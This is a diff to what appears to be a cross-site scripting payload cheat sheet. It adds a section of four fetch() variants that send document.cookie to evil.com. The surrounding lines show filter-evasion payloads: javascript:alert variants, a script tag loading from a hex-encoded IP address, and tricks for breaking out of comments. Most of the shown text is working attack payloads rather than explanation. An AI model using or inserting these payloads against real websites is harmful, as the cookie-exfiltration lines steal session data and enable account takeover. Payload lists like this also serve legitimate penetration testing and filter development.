@@ -33,9 +33,17 @@ doc\u0075ment['cookie']
 window["doc"+"ument"]["cookie"]
 ```
 
+### Concat
+```js
+fetch("//evil.com/?c="+document.cookie)
+fetch("//evil.com/?c=".concat(document.cookie))
+fetch(["//evil.com/?c=", document.cookie].join())
+fetch(`//evil.com/?c=${document.cookie}`) 
+```
+
 ### Href
 
-```
+```js
 <!--javascript -->
 javascript:alert(1)
 JaVaScript:alert(1)
@@ -110,7 +118,7 @@ test@example(<script>alert(0)</script>).com
 ```
 
 ### Without dot 
-```
+```js
 <script src=//0x8ac5c30a>
 ```
 
@@ -124,7 +132,7 @@ location=/javascript:alert%2823%29/.source;
 https://jlajara.gitlab.io/XSS_20_characters
 
 ### Some random payloads
-```
+```js
 '-alert(1)-'
 "-alert(1)-"
 );alert(1)//
@@ -140,7 +148,7 @@ https://jlajara.gitlab.io/XSS_20_characters
 ```
 
 ## Escaping comments by closing tag 
-```
+```html
 <script>
   // comment </script>XSS
  /* comment </script>XSS
